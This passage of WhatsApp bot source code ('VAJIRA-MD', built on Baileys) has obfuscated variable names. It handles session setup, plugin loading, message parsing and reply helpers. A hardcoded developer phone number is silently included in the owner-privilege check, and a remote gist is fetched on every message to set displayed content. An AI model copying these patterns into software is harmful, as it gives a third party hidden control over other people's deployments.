async function startvajirabot() {
  const {
      default: _0x25c328,
      getAggregateVotesInPollMessage: _0x159e01,
      useMultiFileAuthState: _0x591a76,
      DisconnectReason: _0x1030ce,
      getDevice: _0x4c4622,
      fetchLatestBaileysVersion: _0x26762e,
      jidNormalizedUser: _0x26cead,
      getContentType: _0x29ecbc,
      Browsers: _0xc779f3,
      makeInMemoryStore: _0x501099,
      makeCacheableSignalKeyStore: _0x1d0cbd,
      downloadContentFromMessage: _0x509529,
      generateWAMessageFromContent: _0x50c9b0,
      prepareWAMessageMedia: _0x452d94,
      proto: _0x112f06,
    } = require('@whiskeysockets/baileys'),
    _0x5531f7 = require('fs'),
    _0xb547ea = require('pino'),
    _0x3540ab = require('file-type'),
    _0x45ca63 = console.log,
    {
      mongodb_connection_start: _0x5a8392,
      start_numrep_process: _0x114cc5,
      upload_to_mongodb: _0x44423d,
      get_data_from_mongodb: _0x50c3d1,
      storenumrepdata: _0x50fc24,
      getstorednumrep: _0x61987b,
    } = require('./lib/numrepstore')
  await _0x114cc5()
  var _0x4ffdda = require('./settings')
  const {
      searchSinhalasub: _0x4027e5,
      downSinhalasub: _0x32399a,
    } = require('./lib/movie.js'),
    {
      pinterest: _0x2493ec,
      wallpaper: _0x52b630,
      wikimedia: _0x2ca5dd,
      quotesAnime: _0x29efc5,
      aiovideodl: _0x3bd00d,
      umma: _0x49102d,
      ringtone: _0x159e8e,
      styletext: _0xc10f42,
      sync: _0x242cf9,
      updatedb: _0x8ea821,
      syncgit: _0x5d5176,
    } = require('./lib/scraper'),
    _0x211a8a = require('qrcode-terminal')
  const _0x346d64 = require('moment-timezone'),
    _0x5de116 = require('node-cache'),
    _0x5458f8 = require('pino'),
    _0x50a1bc = require('./settings.js'),
    {
      imageToWebp: _0x474878,
      videoToWebp: _0xf46459,
      writeExifImg: _0x561eb7,
      writeExifVid: _0x320adc,
    } = require('./lib/exif')
  var { get_set: _0x3e89ee, input_set: _0x148a56 } = require('./lib/set_db'),
    {
      updateCMDStore: _0x2b4b24,
      isbtnID: _0x2df738,
      getCMDStore: _0x269741,
      getCmdForCmdId: _0x2dff0c,
      connectdb: _0x47c6f9,
      input: _0x26e6f2,
      get: _0x45bdd8,
      updb: _0x6d337f,
      updfb: _0x31b619,
    } = require('./lib/database')
  const _0x3f58e7 = global.owner,
    _0x4498df = global.owner
  var _0x4c43a2 = _0x4ffdda.PREFIX,
    _0x52028a =
      _0x4ffdda.prefix === 'false' || _0x4ffdda.prefix === 'null'
        ? '^'
        : new RegExp('^[' + _0x4ffdda.PREFIX + ']')
  const _0x5dc279 = '_VAJIRA RATHNAYAKA_',
    _0x16f8e6 =
      '\uD83D\uDC68‍\uD83D\uDCBB ＶＡＪＩＲＡ - ＭＤ - Ｖ5 \uD83D\uDC68‍\uD83D\uDCBB'
  const _0x1e0692 = require('util'),
    {
      smsg: _0x456e70,
      getBuffer: _0x36e7ab,
      getGroupAdmins: _0x126789,
      getRandom: _0x45ab9f,
      h2k: _0x12333e,
      isUrl: _0x3b0a09,
      Json: _0x400205,
      runtime: _0x51cbc5,
      sleep: _0x50dead,
      fetchJson: _0xc0abb9,
      fetchBuffer: _0x1ce8d,
      getFile: _0xd83d68,
    } = require('./lib/functions'),
    { sms: _0xa6d2f5, downloadMediaMessage: _0x3eb20c } = require('./lib/msg'),
    _0xaf680d = require('./lib/mg'),
    _0x30c1f1 = require('axios'),
    { File: _0x3ace7a } = require('megajs'),
    _0x24655b = require('path'),
    _0x4ca884 = new _0x5de116()
  function _0x48c98c() {
    const _0x57ddc5 = 'VajiraTech',
      _0x432d21 = '3EB',
      _0x9eb581 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    let _0x3b7384 = _0x432d21
    for (let _0x275d1a = _0x432d21.length; _0x275d1a < 22; _0x275d1a++) {
      const _0x151bdf = Math.floor(Math.random() * _0x9eb581.length)
      _0x3b7384 += _0x9eb581.charAt(_0x151bdf)
    }
    return _0x3b7384
  }
  if (!_0x5531f7.existsSync(__dirname + '/session/creds.json')) {
    if (_0x4ffdda.SESSION_ID) {
      const _0x41ce4e = _0x4ffdda.SESSION_ID.replace('VAJIRA-MD=', ''),
        _0x59be6a = _0x3ace7a.fromURL('https://mega.nz/file/' + _0x41ce4e)
      _0x59be6a.download((_0x16cef2, _0x448004) => {
        if (_0x16cef2) {
          throw _0x16cef2
        }
        _0x5531f7.writeFile(
          __dirname + '/session/creds.json',
          _0x448004,
          () => {
            console.log('Session download completed !! \u2713')
          }
        )
      })
    }
  }
  const _0x4b9e2c = require('express'),
    _0x14ac94 = _0x4b9e2c(),
    _0x8130b2 = process.env.PORT || 8000
  async function _0x2afb75() {
    const { version: _0x5dee7f, isLatest: _0x510edb } = await _0x26762e()
    console.log('using WA v' + _0x5dee7f.join('.') + ', isLatest: ' + _0x510edb)
    const { state: _0x520550, saveCreds: _0x5a26f9 } = await _0x591a76(
      __dirname + '/session/'
    )
    const _0x5d22ff = _0x25c328({
      logger: _0xb547ea({ level: 'fatal' }).child({ level: 'fatal' }),
      printQRInTerminal: true,
      generateHighQualityLinkPreview: true,
      auth: _0x520550,
      defaultQueryTimeoutMs: undefined,
      msgRetryCounterCache: _0x4ca884,
    })
    _0x5d22ff.ev.on('connection.update', async (_0x58e59c) => {
      const { connection: _0x228084, lastDisconnect: _0x57bbbf } = _0x58e59c
      if (_0x228084 === 'close') {
        _0x57bbbf.error.output.statusCode !== _0x1030ce.loggedOut && _0x2afb75()
      } else {
        if (_0x228084 === 'open') {
          console.log('Installing plugins \uD83D\uDD0C... ')
          const _0x223bfe = require('path')
          _0x5531f7.readdirSync('./plugins/').forEach((_0x1e6e0f) => {
            _0x223bfe.extname(_0x1e6e0f).toLowerCase() == '.js' &&
              require('./plugins/' + _0x1e6e0f)
          })
          console.log('Plugins installed \u2705')
          console.log('Bot connected \u2705')
          await _0x5d22ff.sendMessage(_0x3f58e7 + '@s.whatsapp.net', {
            text: 'Connected to whatsapp',
          })
        }
      }
    })
    _0x5d22ff.ev.on('creds.update', _0x5a26f9)
    _0x5d22ff.ev.on('messages.upsert', async (_0x139adb) => {
      try {
        _0x139adb = _0x139adb.messages[0]
        if (!_0x139adb.message) {
          return
        }
        var _0x31e584 = require('./lib/id_db')
        _0x139adb.message =
          _0x29ecbc(_0x139adb.message) === 'ephemeralMessage'
            ? _0x139adb.message.ephemeralMessage.message
            : _0x139adb.message
        if (_0x139adb.key && _0x139adb.key.remoteJid === 'status@broadcast') {
          return
        }
        const _0x3f2d90 = _0xa6d2f5(_0x5d22ff, _0x139adb)
        var _0x346aa9 = _0x3f2d90
        const _0x21b30d = _0x29ecbc(_0x139adb.message),
          _0xff5a6a = JSON.stringify(_0x139adb.message),
          _0x15a124 = _0x139adb.key.remoteJid,
          _0x119fae =
            _0x21b30d == 'extendedTextMessage' &&
            _0x139adb.message.extendedTextMessage.contextInfo != null
              ? _0x139adb.message.extendedTextMessage.contextInfo
                  .quotedMessage || []
              : [],
          _0x136977 =
            _0x21b30d == 'extendedTextMessage' &&
            _0x139adb.message.extendedTextMessage.contextInfo != null
              ? _0x139adb.message.extendedTextMessage.contextInfo.stanzaId ||
                null
              : null
        let _0x1da678
        if (_0x21b30d === 'conversation') {
          _0x1da678 = _0x139adb.message.conversation
        } else {
          if (_0x21b30d === 'extendedTextMessage') {
            const _0x50034c = await _0x61987b(
              _0x136977,
              _0x15a124,
              _0x139adb.message.extendedTextMessage.text,
              _0x5d22ff,
              _0x139adb
            )
            _0x1da678 = _0x50034c
              ? _0x50034c
              : _0x139adb.message.extendedTextMessage.text
          } else {
            if (
              _0x21b30d === 'imageMessage' &&
              _0x139adb.message.imageMessage &&
              _0x139adb.message.imageMessage.caption
            ) {
              _0x1da678 = _0x139adb.message.imageMessage.caption
            } else {
              if (
                _0x21b30d === 'videoMessage' &&
                _0x139adb.message.videoMessage &&
                _0x139adb.message.videoMessage.caption
              ) {
                _0x1da678 = _0x139adb.message.videoMessage.caption
              } else {
                _0x1da678 =
                  _0x21b30d === 'conversation'
                    ? _0x139adb.message.conversation
                    : _0x21b30d === 'extendedTextMessage'
                    ? _0x139adb.message.extendedTextMessage.text
                    : _0x21b30d == 'interactiveResponseMessage'
                    ? _0x139adb.message.interactiveResponseMessage &&
                      _0x139adb.message.interactiveResponseMessage
                        .nativeFlowResponseMessage &&
                      JSON.parse(
                        _0x139adb.message.interactiveResponseMessage
                          .nativeFlowResponseMessage.paramsJson
                      ) &&
                      JSON.parse(
                        _0x139adb.message.interactiveResponseMessage
                          .nativeFlowResponseMessage.paramsJson
                      ).id
                    : _0x21b30d == 'templateButtonReplyMessage'
                    ? _0x139adb.message.templateButtonReplyMessage &&
                      _0x139adb.message.templateButtonReplyMessage.selectedId
                    : _0x21b30d === 'extendedTextMessage'
                    ? _0x139adb.message.extendedTextMessage.text
                    : _0x21b30d == 'imageMessage' &&
                      _0x139adb.message.imageMessage.caption
                    ? _0x139adb.message.imageMessage.caption
                    : _0x21b30d == 'videoMessage' &&
                      _0x139adb.message.videoMessage.caption
                    ? _0x139adb.message.videoMessage.caption
                    : ''
              }
            }
          }
        }
        ;(await _0x2df738(
          _0x139adb.message?.extendedTextMessage?.contextInfo?.stanzaId
        )) &&
        _0x2dff0c(
          await _0x269741(
            _0x139adb.message?.extendedTextMessage?.contextInfo?.stanzaId
          ),
          _0x139adb?.message?.extendedTextMessage?.text
        )
          ? _0x2dff0c(
              await _0x269741(
                _0x139adb.message?.extendedTextMessage?.contextInfo?.stanzaId
              ),
              _0x139adb?.message?.extendedTextMessage?.text
            )
          : _0x21b30d === 'extendedTextMessage'
          ? _0x139adb.message.extendedTextMessage.text
          : _0x21b30d == 'imageMessage' &&
            _0x139adb.message.imageMessage.caption
          ? _0x139adb.message.imageMessage.caption
          : _0x21b30d == 'videoMessage' &&
            _0x139adb.message.videoMessage.caption
          ? _0x139adb.message.videoMessage.caption
          : ''
        var _0x2ffd8f = await _0x3e89ee('all')
        _0x4ffdda = await _0x942714(_0x4ffdda, _0x2ffd8f)
        _0x4c43a2 = _0x4ffdda.PREFIX
        var _0x377950 = _0x1da678.startsWith(_0x4c43a2),
          _0xa405b7 = _0x377950
            ? _0x1da678
                .slice(_0x4c43a2.length)
                .trim()
                .split(' ')
                .shift()
                .toLowerCase()
            : '',
          _0x35757e = _0x1da678.trim().split(/ +/).slice(1),
          _0x3384d9 = _0x35757e.join(' ')
        if (
          _0x346aa9.quoted &&
          _0x346aa9.quoted.fromMe &&
          (await _0x31e584.check(_0x346aa9.quoted.id))
        ) {
          if (_0x1da678.startsWith(_0x4c43a2)) {
            _0x1da678 = _0x1da678.replace(_0x4c43a2, '')
          }
          var _0x377ece = await _0x31e584.get_data(
            _0x346aa9.quoted.id,
            _0x1da678
          )
          if (_0x377ece.cmd) {
            _0x377950 = true
            _0xa405b7 = _0x377ece.cmd.startsWith(_0x4c43a2)
              ? _0x377ece.cmd
                  .slice(_0x4c43a2.length)
                  .trim()
                  .split(' ')
                  .shift()
                  .toLowerCase()
              : ''
            _0x35757e = _0x377ece.cmd.trim().split(/ +/).slice(1)
            _0x3384d9 = _0x35757e.join(' ')
          }
        }
        console.log(_0xa405b7)
        const _0x3a2c17 = _0x15a124.endsWith('@g.us'),
          _0x50cf7c = _0x139adb.key.fromMe
            ? _0x5d22ff.user.id.split(':')[0] + '@s.whatsapp.net' ||
              _0x5d22ff.user.id
            : _0x139adb.key.participant || _0x139adb.key.remoteJid,
          _0x1583dd = _0x50cf7c.split('@')[0],
          _0x41c327 = _0x5d22ff.user.id.split(':')[0],
          _0x1be3c5 = _0x139adb.pushName || 'Sin Nombre',
          _0x118228 = '94719199757',
          _0x5a0a1e = _0x41c327.includes(_0x1583dd),
          _0x8cf2d2 = _0x118228.includes(_0x1583dd),
          _0x3ddd92 = _0x5a0a1e ? _0x5a0a1e : _0x8cf2d2,
          _0x21905c = _0x3f58e7.includes(_0x1583dd) || _0x3ddd92,
          _0x1100a8 = await _0x26cead(_0x5d22ff.user.id),
          _0x26be68 = _0x3a2c17
            ? await _0x5d22ff.groupMetadata(_0x15a124).catch((_0x1ac60a) => {})
            : '',
          _0x5f3cdb = _0x3a2c17 ? _0x26be68.subject : '',
          _0x32d014 = _0x3a2c17 ? await _0x26be68.participants : '',
          _0x10c943 = _0x3a2c17 ? await _0x126789(_0x32d014) : '',
          _0x1c41d8 = _0x3a2c17 ? _0x10c943.includes(_0x1100a8) : false,
          _0x4c84b9 = _0x3a2c17 ? _0x10c943.includes(_0x50cf7c) : false,
          _0x41dd58 = _0x3f2d90.message.reactionMessage ? true : false
        autoreadsw = false
        const _0x4b6ec5 = (_0x28e02d) => {
            let _0x138319 = _0x28e02d
            for (let _0x5c8c9f = 0; _0x5c8c9f < _0x138319.length; _0x5c8c9f++) {
              if (_0x138319[_0x5c8c9f] === _0x15a124) {
                return true
              }
            }
            return false
          },
          _0x4bca34 = (_0x33c71b) => {
            const _0x194f68 = {}
            return (
              (_0x194f68.text = _0x33c71b),
              _0x5d22ff.sendMessage(_0x15a124, _0x194f68)
            )
          },
          _0x46f8f4 = (_0x355e5c, _0x1dc3c8) => {
            const _0x38c8e4 = {
              text: _0x355e5c,
              key: _0x1dc3c8.key,
            }
            const _0x244019 = {}
            return (
              (_0x244019.react = _0x38c8e4),
              _0x5d22ff.sendMessage(_0x15a124, _0x244019)
            )
          },
          _0x2f7872 = (_0x5bc88f) => {
            const _0x1839b9 = {}
            return (
              (_0x1839b9.text = _0x5bc88f),
              _0x5d22ff.sendMessage(_0x15a124, _0x1839b9)
            )
          }
        _0x5d22ff.storenumrepdata = async (_0x27b723) => {
          return await _0x50fc24(_0x27b723)
        }
        const _0x10f6b5 = (
          await _0x30c1f1.get(
            'https://gist.github.com/VajiraTech/f283f0ea1fc115dbbf502f424074420a/raw'
          )
        ).data
        _0x4ffdda.LOGO = _0x10f6b5.imageurl
        _0x4ffdda.BTN = _0x10f6b5.button
        _0x4ffdda.CONTACT = _0x10f6b5.contact
        _0x4ffdda.FOOTER = _0x10f6b5.footer
        _0x4ffdda.BTNURL = _0x10f6b5.buttonurl
        _0x5d22ff.edit = async (_0x3b01e5, _0x50c3c8) => {
          const _0x3ff3bf = { conversation: _0x50c3c8 }
          const _0x54aab9 = {
            key: _0x3b01e5.key,
            type: 14,
            editedMessage: _0x3ff3bf,
          }
          const _0x3d0b38 = { protocolMessage: _0x54aab9 }
          await _0x5d22ff.relayMessage(_0x15a124, _0x3d0b38, {})
        }
        _0x5d22ff.sendFileUrl = async (
          _0x307356,
          _0x405746,
          _0x54cf20,
          _0x58303d,
          _0x30b68f = {}
        ) => {
          let _0x947e83 = '',
            _0x48dfbe = await _0x30c1f1.head(_0x405746)
          _0x947e83 = _0x48dfbe.headers['content-type']
          if (_0x947e83.split('/')[1] === 'gif') {
            return _0x5d22ff.sendMessage(
              _0x307356,
              {
                video: await _0x36e7ab(_0x405746),
                caption: _0x54cf20,
                gifPlayback: true,
                ..._0x30b68f,
              },
              {
                quoted: _0x58303d,
                ..._0x30b68f,
              }
            )
          }
          let _0x1521df = _0x947e83.split('/')[0] + 'Message'
          if (_0x947e83 === 'application/pdf') {
            return _0x5d22ff.sendMessage(
              _0x307356,
              {
                document: await _0x36e7ab(_0x405746),
                mimetype: 'application/pdf',
                caption: _0x54cf20,
                ..._0x30b68f,
              },
              {
                quoted: _0x58303d,
                ..._0x30b68f,
              }
            )
          }
          if (_0x947e83.split('/')[0] === 'image') {
            return _0x5d22ff.sendMessage(
              _0x307356,
              {
                image: await _0x36e7ab(_0x405746),
                caption: _0x54cf20,
                ..._0x30b68f,
              },
              {
                quoted: _0x58303d,
                ..._0x30b68f,
              }
            )
          }
          if (_0x947e83.split('/')[0] === 'video') {
            return _0x5d22ff.sendMessage(
              _0x307356,
              {
                video: await _0x36e7ab(_0x405746),
                caption: _0x54cf20,
                mimetype: 'video/mp4',
                ..._0x30b68f,
              },
              {
                quoted: _0x58303d,
                ..._0x30b68f,
              }
            )
          }
          if (_0x947e83.split('/')[0] === 'audio') {
            return _0x5d22ff.sendMessage(
              _0x307356,
              {
                audio: await _0x36e7ab(_0x405746),
                caption: _0x54cf20,
                mimetype: 'audio/mpeg',
                ..._0x30b68f,
              },
              {
                quoted: _0x58303d,
                ..._0x30b68f,
              }
            )
          }
        }
        _0x5d22ff.sendButtonMessage = async (
          _0xc051a9,
          _0x3d3e81,
          _0x19101a,
          _0x1fcea2 = {}
        ) => {
          let _0x572c48
          if (_0x1fcea2?.video) {
            const _0x3d1e07 = {
              url: _0x1fcea2 && _0x1fcea2.video ? _0x1fcea2.video : '',
            }
            const _0x2255e5 = { video: _0x3d1e07 }
            const _0xe44140 = { upload: _0x5d22ff.waUploadToServer }
            var _0x31998e = await _0x452d94(_0x2255e5, _0xe44140)
            const _0x1ededd = {
              title: _0x1fcea2 && _0x1fcea2.header ? _0x1fcea2.header : '',
              hasMediaAttachment: true,
              videoMessage: _0x31998e.videoMessage,
            }
            _0x572c48 = _0x1ededd
          } else {
            if (_0x1fcea2?.image) {
              const _0x56979f = {
                url: _0x1fcea2 && _0x1fcea2.image ? _0x1fcea2.image : '',
              }
              const _0x462436 = { image: _0x56979f }
              const _0x474293 = { upload: _0x5d22ff.waUploadToServer }
              var _0x5554f0 = await _0x452d94(_0x462436, _0x474293)
              const _0x13f376 = {
                title: _0x1fcea2 && _0x1fcea2.header ? _0x1fcea2.header : '',
                hasMediaAttachment: true,
                imageMessage: _0x5554f0.imageMessage,
              }
              _0x572c48 = _0x13f376
            } else {
              const _0x40174d = {
                title: _0x1fcea2 && _0x1fcea2.header ? _0x1fcea2.header : '',
                hasMediaAttachment: false,
              }
              _0x572c48 = _0x40174d
            }
          }
          const _0x291801 = {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          }
          const _0x4a2d63 = {
            text: _0x1fcea2 && _0x1fcea2.body ? _0x1fcea2.body : '',
          }
          const _0x413199 = {
            text: _0x1fcea2 && _0x1fcea2.footer ? _0x1fcea2.footer : '',
          }
          const _0x5b7773 = {
            buttons: _0x3d3e81,
            messageParamsJson: '',
          }
          const _0x1f1a61 = {
            body: _0x4a2d63,
            footer: _0x413199,
            header: _0x572c48,
            nativeFlowMessage: _0x5b7773,
          }
          const _0x523a4e = {
            messageContextInfo: _0x291801,
            interactiveMessage: _0x1f1a61,
          }
          const _0x1a2f86 = { message: _0x523a4e }
          const _0x38b713 = { viewOnceMessage: _0x1a2f86 }
          const _0x1cadf9 = { quoted: _0x19101a }
          let _0x245958 = _0x50c9b0(_0xc051a9, _0x38b713, _0x1cadf9)
          return (
            await _0x5d22ff.sendPresenceUpdate('composing', _0xc051a9),
            await _0x50dead(1000),
            await _0x5d22ff.relayMessage(_0xc051a9, _0x245958.message, {
              messageId: _0x245958.key.id,
            })
          )
        }
        function _0x942714(_0x24e426, _0x5679ab) {
          for (var _0x8489ea in _0x5679ab) {
            _0x24e426[_0x8489ea] = _0x5679ab[_0x8489ea]
          }
          return _0x24e426
        }
        var _0x2ffd8f = await _0x3e89ee('all')
        _0x4ffdda = await _0x942714(_0x4ffdda, _0x2ffd8f)
        _0x5d22ff.replyad = async (_0x401ad3) => {
          const _0x537365 = {
            newsletterJid: '120363182681793169@newsletter',
            serverMessageId: 127,
          }
          const _0x372099 = {
            title:
              '\uD83D\uDC68‍\uD83D\uDCBB ＶＡＪＩＲＡ - ＭＤ - Ｖ5 \uD83D\uDC68‍\uD83D\uDCBB',
            body: '𓄂⃫尺𝚲丂н_❖',
            mediaType: 1,
            sourceUrl: 'https://wa.me/94719199757',
            thumbnailUrl: 'https://telegra.ph/file/8aaa9451a1eb739d3a73a.jpg',
            renderLargerThumbnail: false,
            showAdAttribution: true,
          }
          const _0x53a349 = {
            mentionedJid: [''],
            groupMentions: [],
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: _0x537365,
            externalAdReply: _0x372099,
          }
          const _0xe2d4af = {
            text: _0x401ad3,
            contextInfo: _0x53a349,
          }
          const _0x58ae2c = {}
          return (
            (_0x58ae2c.quoted = _0x139adb),
            await _0x5d22ff.sendMessage(_0x15a124, _0xe2d4af, _0x58ae2c)
          )
        }
        _0x5d22ff.buttonMessage2 = async (_0x48e93d, _0x40f673, _0x22c10d) => {
          let _0x2125ce = ''
          const _0x149dae = []
          _0x40f673.buttons.forEach((_0x31ef78, _0x2d113c) => {
            const _0x5ce2fb = '' + (_0x2d113c + 1)
            _0x2125ce +=
              '\n' + _0x5ce2fb + ' | ' + _0x31ef78.buttonText.displayText + '\n'
            const _0x3683d6 = {
              cmdId: _0x5ce2fb,
              cmd: _0x31ef78.buttonId,
            }
            _0x149dae.push(_0x3683d6)
          })
          if (_0x40f673.headerType === 1) {
            const _0xaee340 =
                _0x40f673.text +
                '\n\n\uD83D\uDD22 Reply you want number,' +
                _0x2125ce +
                '\n' +
                _0x40f673.footer,
              _0x4e213a = {
                newsletterJid: '120363182681793169@newsletter',
                serverMessageId: 127,
              }
            const _0x4b1547 = {
              title:
                '\uD83D\uDC68‍\uD83D\uDCBB ＶＡＪＩＲＡ - ＭＤ - Ｖ5 \uD83D\uDC68‍\uD83D\uDCBB',
              body: '𓄂⃫尺𝚲丂н_❖',
              mediaType: 1,
              sourceUrl: 'https://wa.me/94707765200',
              thumbnailUrl: 'https://telegra.ph/file/8aaa9451a1eb739d3a73a.jpg',
              renderLargerThumbnail: false,
              showAdAttribution: true,
            }
            const _0x3e84eb = {
              mentionedJid: [''],
              groupMentions: [],
              forwardingScore: 1,
              isForwarded: true,
              forwardedNewsletterMessageInfo: _0x4e213a,
              externalAdReply: _0x4b1547,
            }
            const _0x3a8314 = {
              text: _0xaee340,
              contextInfo: _0x3e84eb,
            }
            const _0x1acbc3 = await _0x5d22ff.sendMessage(
              _0x15a124,
              _0x3a8314,
              { quoted: _0x22c10d || _0x139adb }
            )
            await _0x2b4b24(_0x1acbc3.key.id, _0x149dae)
          } else {
            if (_0x40f673.headerType === 4) {
              const _0x284c2f =
                  _0x40f673.caption +
                  '\n\n\uD83D\uDD22 Reply you want number,' +
                  _0x2125ce +
                  '\n' +
                  _0x40f673.footer,
                _0x216145 = {
                  newsletterJid: '120363182681793169@newsletter',
                  serverMessageId: 127,
                }
              const _0x211985 = {
                title:
                  '\uD83D\uDC68‍\uD83D\uDCBB 𓄂⃫尺𝚲丂н_❖ - ＭＤ - Ｖ1 \uD83D\uDC68‍\uD83D\uDCBB',
                body: '𓄂⃫尺𝚲丂н_❖',
                mediaType: 1,
                sourceUrl: 'https://wa.me/94719199757',
                thumbnailUrl:
                  'https://telegra.ph/file/8aaa9451a1eb739d3a73a.jpg',
                renderLargerThumbnail: false,
                showAdAttribution: true,
              }
              const _0x305d61 = {
                mentionedJid: [''],
                groupMentions: [],
                forwardingScore: 1,
                isForwarded: true,
                forwardedNewsletterMessageInfo: _0x216145,
                externalAdReply: _0x211985,
              }
              const _0x3a6b19 = {
                image: _0x40f673.image,
                caption: _0x284c2f,
                contextInfo: _0x305d61,
              }
              const _0x7f474c = await _0x5d22ff.sendMessage(
                _0x48e93d,
                _0x3a6b19,
                { quoted: _0x22c10d || _0x139adb }
              )
              await _0x2b4b24(_0x7f474c.key.id, _0x149dae)
            }
          }
        }
        _0x5d22ff.replyList = async (_0x297467, _0x14f1e5, _0xab5d36) => {
          function _0x47ae31(_0x3fbbea) {
            let _0x5de020 = ''
            return (
              _0x3fbbea.forEach((_0x5c3283, _0x5b7beb) => {
                _0x5de020 += _0x5c3283.title ? _0x5c3283.title + '\n' : ''
                _0x5c3283.rows.forEach((_0x2ca8a5, _0x4c9bbe) => {
                  ;(_0x5de020 +=
                    _0x2ca8a5.title + ' || ' + _0x2ca8a5.description),
                    (_0x5de020 +=
                      _0x4c9bbe === _0x5c3283.rows.length - 1 ? '' : '\n')
                })
                _0x5de020 += _0x5b7beb === _0x3fbbea.length - 1 ? '' : '\n\n'
              }),
              _0x5de020
            )
          }
          if (!_0x14f1e5.sections) {
            return false
          }
          _0x14f1e5[_0x14f1e5.caption ? 'caption' : 'text'] =
            (_0x14f1e5.title ? _0x14f1e5.title + '\n\n' : '') +
            (_0x14f1e5.caption ? _0x14f1e5.caption : _0x14f1e5.text) +
            '\n\n' +
            _0x14f1e5.buttonText +
            '\n\n' +
            (await _0x47ae31(_0x14f1e5.sections)) +
            '\n\n' +
            _0x14f1e5.footer
          const _0x4b033d = { ..._0x14f1e5 }
          var _0x1232da = _0x4b033d
          delete _0x14f1e5.sections
          delete _0x14f1e5.footer
          delete _0x14f1e5.buttonText
          delete _0x14f1e5.title
          const _0x14832e = await _0x5d22ff.sendMessage(
              _0x297467,
              _0x14f1e5,
              _0xab5d36
            ),
            _0x220526 = []
          _0x1232da.sections.forEach((_0x4c9a58) => {
            _0x4c9a58.rows.forEach((_0x5ca6ce) => {
              const _0x47eef4 = {
                rowId: _0x5ca6ce.rowId,
                title: _0x5ca6ce.title,
              }
              _0x220526.push(_0x47eef4)
            })
          })
          for (let _0x113ba9 = 0; _0x113ba9 < _0x220526.length; _0x113ba9++) {
            await _0x31e584.input_data(
              _0x220526[_0x113ba9].rowId,
              _0x220526[_0x113ba9].title,
              _0x14832e.key.id
            )
          }
        }
        _0x5d22ff.buttonMessage = async (_0x278615, _0x48c66e, _0x44ffdf) => {
          let _0x3d11fd = ''
          const _0x184dd1 = []
          _0x48c66e.buttons.forEach((_0xcb516, _0xdedc7d) => {
            const _0x53336a = '' + (_0xdedc7d + 1)
            _0x3d11fd +=
              '\n' + _0x53336a + ' | ' + _0xcb516.buttonText.displayText + '\n'
            const _0x286c12 = {
              cmdId: _0x53336a,
              cmd: _0xcb516.buttonId,
            }
            _0x184dd1.push(_0x286c12)
          })
          if (_0x48c66e.headerType === 1) {
            const _0x2105e0 =
                (_0x48c66e.text || _0x48c66e.caption) +
                '\n\uD83D\uDD22 Reply you want number,' +
                _0x3d11fd +
                '\n\n' +
                _0x48c66e.footer,
              _0x3aaad0 = {
                newsletterJid: '120363182681793169@newsletter',
                serverMessageId: 127,
              }
            const _0x211ab9 = {
              title:
                '\uD83D\uDC68‍\uD83D\uDCBB 𓄂⃫尺𝚲丂н_❖ - ＭＤ - Ｖ1 \uD83D\uDC68‍\uD83D\uDCBB',
              body: ' 𓄂⃫尺𝚲丂н_❖',
              mediaType: 1,
              sourceUrl: 'https://wa.me/94719199757',
              thumbnailUrl: 'https://telegra.ph/file/8aaa9451a1eb739d3a73a.jpg',
              renderLargerThumbnail: false,
              showAdAttribution: true,
            }
            const _0x3203a9 = {
              mentionedJid: [''],
              groupMentions: [],
              forwardingScore: 1,
              isForwarded: true,
              forwardedNewsletterMessageInfo: _0x3aaad0,
              externalAdReply: _0x211ab9,
            }
            const _0x23c04c = {
              text: _0x2105e0,
              contextInfo: _0x3203a9,
            }
            const _0x52a5c3 = await _0x5d22ff.sendMessage(
              _0x15a124,
              _0x23c04c,
              { quoted: _0x44ffdf || _0x139adb }
            )
            await _0x2b4b24(_0x52a5c3.key.id, _0x184dd1)
          } else {
            if (_0x48c66e.headerType === 4) {
              const _0x56782d =
                  _0x48c66e.caption +
                  '\n\n\uD83D\uDD22 Reply you want number,' +
                  _0x3d11fd +
                  '\n' +
                  _0x48c66e.footer,
                _0xc0346d = {
                  newsletterJid: '120363182681793169@newsletter',
                  serverMessageId: 127,
                }
              const _0x36e5b3 = {
                title:
                  '\uD83D\uDC68‍\uD83D\uDCBB 𓄂⃫尺𝚲丂н_❖ - ＭＤ - Ｖ1 \uD83D\uDC68‍\uD83D\uDCBB',
                body: '𓄂⃫尺𝚲丂н_❖',
                mediaType: 1,
                sourceUrl: 'https://wa.me/94707765200',
                thumbnailUrl:
                  'https://telegra.ph/file/8aaa9451a1eb739d3a73a.jpg',
                renderLargerThumbnail: false,
                showAdAttribution: true,
              }
              const _0x29055c = {
                mentionedJid: [''],
                groupMentions: [],
                forwardingScore: 1,
                isForwarded: true,
                forwardedNewsletterMessageInfo: _0xc0346d,
                externalAdReply: _0x36e5b3,
              }
              const _0x3e8c2b = {
                image: _0x48c66e.image,
                caption: _0x56782d,
                contextInfo: _0x29055c,
              }
              const _0x1551ca = await _0x5d22ff.sendMessage(
                _0x278615,
                _0x3e8c2b,
                { quoted: _0x44ffdf || _0x139adb }
              )
              await _0x2b4b24(_0x1551ca.key.id, _0x184dd1)
            }
          }
        }
        _0x5d22ff.listMessage2 = async (_0x36912b, _0x25cc11, _0x283abb) => {
          let _0xea8645 = ''
          const _0x4520bd = []
          _0x25cc11.sections.forEach((_0x43f620, _0x23a924) => {
            const _0x28e955 = '' + (_0x23a924 + 1)
            _0xea8645 += '\n[' + _0x28e955 + '] ' + _0x43f620.title + '\n'
            _0x43f620.rows.forEach((_0x524255, _0x493e40) => {
              const _0x9a917c = _0x28e955 + '.' + (_0x493e40 + 1),
                _0x4ac658 = '   ' + _0x9a917c + ' | ' + _0x524255.title
              _0xea8645 += _0x4ac658 + '\n'
              if (_0x524255.description) {
                _0xea8645 += '   ' + _0x524255.description + '\n\n'
              }
              const _0x1655fa = {
                cmdId: _0x9a917c,
                cmd: _0x524255.rowId,
              }
              _0x4520bd.push(_0x1655fa)
            })
          })
          const _0x3eefa6 =
              _0x25cc11.text +
              '\n\n' +
              _0x25cc11.buttonText +
              ',' +
              _0xea8645 +
              '\n' +
              _0x25cc11.footer,
            _0x204aa0 = {
              newsletterJid: '120363182681793169@newsletter',
              serverMessageId: 127,
            }
          const _0x58939d = {
            title:
              '\uD83D\uDC68‍\uD83D\uDCBB 𓄂⃫尺𝚲丂н_❖ - ＭＤ - Ｖ1 \uD83D\uDC68‍\uD83D\uDCBB',
            body: '𓄂⃫尺𝚲丂н_❖',
